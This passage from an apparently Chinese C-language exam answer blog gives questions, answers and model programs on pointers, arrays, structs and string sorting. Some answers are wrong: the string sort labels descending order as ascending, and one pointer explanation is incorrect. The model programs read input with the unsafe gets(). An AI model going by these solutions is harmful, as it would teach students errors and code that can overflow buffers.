3)的值是4，同理，*(p+5)的值是6，最终a = 1 * 4 * 6 = 24，二维数组本身在内存中的存储方式是按一维数组存储的，连续的</p></li><li><p>在位运算中，操作数每左移1位，其结果相当于<br>A. 操作数除以2<br>B. 操作数乘以2<br>C. 操作数除以4<br>D. 操作数乘以4<br>答案：<code>B</code><br>解析：计算机底层的数据只有2进制，以最常见的八位二进制数00000001（十进制数1）为例，左移一位将变为00000010（十进制数2），最高位的0将会被丢掉（左移不管最高位是0还是1，都会丢掉），所以左移相当于是x2，同理，右移，有一点点小区别，最低位的0被丢掉了（右移不管最低位是0还是1，都会丢掉），然后最高位空了，这是不行的，计算机会进行高位补0的操作，所以右移相当于/2，看不懂我的叙述就在纸上模拟一般这个过程，大概就明白了</p></li><li><p>若有定义int a[3][4];则输入其3行2列元素的正确语句是<br>A. scanf(“%d”,a[3,2]);<br>B. scanf(“%d”,*(*(a+2)+1));<br>C. scanf(“%d”,<em>(a+2)+1);<br>D. scanf(“%d”,</em>(a[2]+1);<br>答案：<code>C</code><br>解析：3行2列元素是a[2][1]，scanf函数的参数是指针（地址值），所以合法的应该是&amp;a[2][1]，而&amp;a[2][1]等价于*((a+2)+1)</p></li><li><p>将p定义为指向含4个元素的一维数组的指针变量，正确语句是<br>A. int (<em>p)[4];<br>B. int *p[4];<br>C. int *</em>p[4];<br>D. int p[4];<br>答案：<code>A</code><br>解析：B选项是指针数组；C选项也是指针数组；D选项就是数组</p></li><li><p>有如下定义:<br><code>struct person {char name[9];int age;};</code><br><code>struct person class[10]=({&quot;Johu&quot;,17,&quot;Paul&quot;,19,&quot;Mary&quot;,18,&quot;Adam&quot;,16};</code><br>根据上述定义，能输出字母M的语句是<br>A. print(“%c\n”,class[3].name);<br>B. print(“%c\n”,class[3].name[1]);<br>C. print(“%c\n”,class[2].name[1);<br>D. print(“%c\n”,class[2].name[0]);<br>答案：<code>D</code><br>解析：class[2]是{“Mary”,18}，class[2].name[0]就是字母’M’</p></li><li><p>若已建立下图所示的单链表结构:<br><img src="/posts/28b181d9/2019-11-19-21-44-00.png" alt="9题图"><br>在该链表结构中，指针p、s分别指向图中所示结点，则不能将s所指的结点插入到链表末尾仍构成单向链表的语句组是<br>A. p=p-&gt;next; s-&gt;next=p; p-&gt;next=s;<br>B. p=p-&gt;next; s-&gt;next=p-&gt;next; p-&gt;next=s;<br>C. s~&gt;next=NULL; p=p-&gt;next; p-&gt;next=s;<br>D. p=(*p).next; (*s).next=(*p).next; (*p).next-s;<br>答案：<code>A</code><br>解析：p=p-&gt;next;将p后移了一个，现在的p指向末尾的结点了，s-&gt;next=p;将p，也就是链表的末尾赋值给s的指针域，s-&gt;next现在指向末尾结点位置，p-&gt;next=s，将s赋值给p的指针域，也就是现在链表末尾的结点指向s，没有构成链表，换句话说，这样的操作导致链表断掉了</p></li><li><p>在一个源文件中，定义的全局变量的作用域为<br>A. 本文件的全部范围<br>B. 从定义该变量的位置开始至本文件结束<br>C. 本函数的全部范围<br>D. 本程序的全部范围<br>答案：<code>B</code><br>解析：多次强调过全局变量的作用域了，如还不知道，请翻阅前几年的真题解析</p></li></ol><h2 id="判断题"><a href="#判断题" class="headerlink" title="判断题"></a>判断题</h2><ol start="11"><li>用do-while语句构成的循环，在while后的表达式为零时结束循环<br>答案：<code>√</code><br>解析：这里的表达式指的是是do{}while(表达式)语句中，while后面括号里的表达式</li><li>在用字符串常量初始化字符数组时，数组长度应等于字符串有效字符的个数<br>答案：<code>×</code><br>解析：一般数组长度应该大于字符串有效字符的个数，因为末尾会自动加上结束符’\0’，但是实际情况中，用这种方式初始化的时候，一般不指定数组长度，由编译器自动确定</li><li>若使用数组名作为函数调用的实参，则传递给形参的是实参数组中全部元素的值<br>答案：<code>×</code><br>解析：传递的是数组首地址，一般情况下，数组名都代表数组首地址</li><li>在C语言复合语句中定义的变量只在该复合语句中有效<br>答案：<code>√</code><br>解析：在复合语句（一般是由一对花括号中间的语句块）中定义的变量也是局部变量，作用范围自然是从定义的地方开始，到语句块结束</li><li>在switch语句中break语句必须和case配对使用<br>答案：<code>×</code><br>解析：default后也可写break</li><li>函数调用时，如果形参和实参的类型不一致,以实参为准<br>答案：<code>×</code><br>解析：应该以形参为准，这样的函数调用过程，会存在自动类型转换的过程</li><li>自增运算符(++)或自减运算符(--)只能用于变量，不能用于常量或表达式<br>答案：<code>√</code><br>解析：不能用于常量是一定的，这里解释下为什么不能用于表达式，这是因为表达式一旦确定（表达式的操作数确定，表达式的运算符确定），表达式的值其实就已经确定了，而表达式的值是CPU调度程序完成计算之后，临时存储在寄存器中的，所以相当于常量，不能修改</li><li>若定义int(*p)[];则p是一个指向一维数组的指针变量<br>答案：<code>×</code><br>解析：没给大小，这里必须要指定大小，代表指向有几个元素的一维数组指针变量</li><li>数组初始化时被赋值的元素的个数决定了这个数组所占内存单元的个数<br>答案：<code>×</code><br>解析：数组的大小在声明时已经给出，而不是由初始化被赋值元素的个数决定的</li><li>在程序中定义一个结构体类型后，编译器将为结构体的各成员分配存储空间<br>答案：<code>×</code><br>解析：定义类型并不会分配空间，只有在定义变量时才会分配内存空间</li></ol><h2 id="程序分析题"><a href="#程序分析题" class="headerlink" title="程序分析题"></a>程序分析题</h2><ol start="21"><li><p>阅读程序，描述程序的功能，当输入: Zhangsen 28/Liming 58/Liuwei 40/时，写出运行结果。(/表示回车，后同)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span>&#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">&#125;man[<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,key = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">person</span> *<span class="title">p</span>,*<span class="title">q</span>;</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">3</span>;i++)</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s %d"</span>,man[i].name,&amp;man[i].age);</span><br><span class="line">  <span class="keyword">for</span> (p = man;p &lt; man + <span class="number">3</span>;p++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;age &gt; key)</span><br><span class="line">    &#123;</span><br><span class="line">      q = p;</span><br><span class="line">      key = p-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s,%d\n"</span>,q-&gt;name,q-&gt;age);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：</p><ul><li>功能：输入三个人的姓名和年龄，存入结构体数组中，输出三者中年龄最高的人的所有信息</li><li>输出结果：<code>Liming,58</code></li></ul></li><li><p>阅读程序，描述程序的功能，写出程序运行结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str1[<span class="number">100</span>],str2[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">char</span> *p1,*p2;</span><br><span class="line">  <span class="keyword">int</span> k,j,i,len;</span><br><span class="line">  </span><br><span class="line">  p1 = str1;</span><br><span class="line">  p2 = str2;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,p1);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,p2);</span><br><span class="line">  k = j = i = <span class="number">0</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(str2);</span><br><span class="line">  <span class="keyword">while</span> (p1[k] != <span class="string">'\0'</span> &amp;&amp; p2[j] !=<span class="string">'\0'</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (p1[k] == p2[j]) &#123;k++;j++;&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;i++;k = i;j = <span class="number">0</span>;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (j &gt;= len) <span class="built_in">printf</span>(<span class="string">"Yes\n"</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"No\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：</p><ul><li>功能：输入两个字符串str1和str2，判断str2是不是str1的子串，是就输出Yes，否则输出No<br>输出结果：</li><li>当输入: asdfgrty qwert/时，程序运行结果为:</li><li>当输入: asdfgrty fgrt/时，程序运行结果为:</li></ul></li><li><p>阅读程序，描述程序的功能，当输入：This is a test of C Program Language!/，写出程序运行结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">80</span>];</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  gets(str);</span><br><span class="line">  <span class="keyword">while</span> (str[i] != <span class="string">'\0'</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (str[i] &gt;= <span class="string">'a'</span> &amp;&amp; str[i] &lt;= <span class="string">'z'</span>) str[i] = str[i] - <span class="string">'a'</span> + <span class="string">'A'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (str[i] &gt;= <span class="string">'A'</span> &amp;&amp; str[i] &lt;= <span class="string">'Z'</span>) str[i] = str[i] - <span class="string">'A'</span> + <span class="string">'a'</span>;</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,str);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：</p><ul><li>功能：将输入的字符串中的字母进行字母大小写互换<br>输出结果：<code>tHIS IS A TEST OF c pROGRAM lANGUAGE!</code></li></ul></li></ol><h2 id="程序设计题"><a href="#程序设计题" class="headerlink" title="程序设计题"></a>程序设计题</h2><ol start="24"><li><p>请编写函数fun,函数的功能是求出二维数组a周边元素之和，作为函数值返回。例如:若二维数组<br>如下:<br>1 3 5 7 9<br>2 9 9 9 4<br>6 9 9 9 8<br>1 3 5 7 0<br>则函数返回值为61。在主函数中赋予二维数组(大小为M*N, M、N由符号常量确定)值，调用fun函数进行计算，并输出计算结果。要求自行设计fun函数，在主函数中，输入、输出时，应显示适当提示信息<br>答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>,i,j;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; M;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; N;j++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (i == <span class="number">0</span> || i == M - <span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 第一行和最后一行全加</span></span><br><span class="line">        sum += a[i][j]; </span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 其他行只加第一列和最后一列 </span></span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || j == N - <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          sum += a[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a[M][N],i,j,sum;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"请输入数组a[%d][%d]，共%d个整数\n"</span>,M,N,M * N);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; M;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; N;j++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sum = fun(a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"a的周边元素之和是：%d"</span>,sum);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>学生的记录由学号、数学和C语言成绩(用整数表示)组成，输入N名学生的数据(N值由符号常量确定),统计C语言分数最高的学生的人数(注意:分数最高的学生可能不只一个)，并输出C语言分数最高的学生人数及其各项数据。要求输入、输出时，应显示适当的提示信息<br>答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 10</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">  <span class="keyword">char</span> stuNum[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">int</span> math;</span><br><span class="line">  <span class="keyword">int</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">(struct student *s,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入第%d个学生的学号："</span>,i + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s[i].stuNum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入第%d个学生的数学成绩："</span>,i + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;s[i].math);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入第%d个学生的C语言成绩："</span>,i + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;s[i].c);</span><br><span class="line">    getchar();<span class="comment">// 干掉残留的回车符，不然下次学号输入可能出错 </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> m = <span class="number">0</span>,i,maxScore = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[<span class="title">N</span>],<span class="title">max</span>[<span class="title">N</span>];</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"请输入学生信息：\n"</span>);</span><br><span class="line">  input(stu,N);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; N;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (stu[i].c &gt; maxScore)</span><br><span class="line">    &#123;</span><br><span class="line">      maxScore = stu[i].c; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; N;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (stu[i].c == maxScore)</span><br><span class="line">    &#123;</span><br><span class="line">      max[m++] = stu[i]; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"统计结果：\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"C语言分数最高的学生人数是：%d\n"</span>,m);</span><br><span class="line">  <span class="keyword">while</span> (m-- &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"学号：%s，数学成绩：%d，C语言成绩：%d\n"</span>,max[m].stuNum,max[m].math,max[m].c);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在主程序中输入10个字符串，调用sort函数进行冒泡排序，然后在主函数中输出排序结果，其中字符串长度不超过20，字符串排序方式(按字母序递增用1表示，按字母序递减用0表示)和待排序的字符串由参数传递给sort 函数。要求自行设计sort函数，在主函数中，输入、输出应有相应提示。<br>答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">string</span>&#123;</span></span><br><span class="line">  <span class="keyword">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(struct _string strs[N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; N;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    strs[i].data = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * M);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">(struct _string strs[N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; N;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入第%d个字符串："</span>,i + <span class="number">1</span>);</span><br><span class="line">    gets(strs[i].data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(struct _string strs[N])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; N;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,strs[i].data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retrieve</span><span class="params">(struct _string strs[N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; N;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(strs[i].data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(struct _string strs[N],<span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line">  <span class="keyword">if</span> (m == <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; N - <span class="number">1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (j = i + <span class="number">1</span>;j &lt; N;j++)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(strs[i].data,strs[j].data) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">char</span> *t = strs[j].data;</span><br><span class="line">          strs[j].data = strs[i].data;</span><br><span class="line">          strs[i].data = t;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (m == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; N - <span class="number">1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (j = i + <span class="number">1</span>;j &lt; N;j++)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(strs[i].data,strs[j].data) &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">char</span> *t = strs[j].data;</span><br><span class="line">          strs[j].data = strs[i].data;</span><br><span class="line">          strs[i].data = t;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">string</span> <span class="title">strs</span>[<span class="title">N</span>];</span></span><br><span class="line">  init(strs);<span class="comment">// 申请动态空间 </span></span><br><span class="line">  input(strs);<span class="comment">// 输入 </span></span><br><span class="line">  sort(strs,<span class="number">1</span>);<span class="comment">// 排序 </span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"按字母序递增：\n"</span>);</span><br><span class="line">  print(strs);<span class="comment">// 输出 </span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"按字母序递减：\n"</span>);</span><br><span class="line">  sort(strs,<span class="number">0</span>);</span><br><span class="line">  print(strs);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" 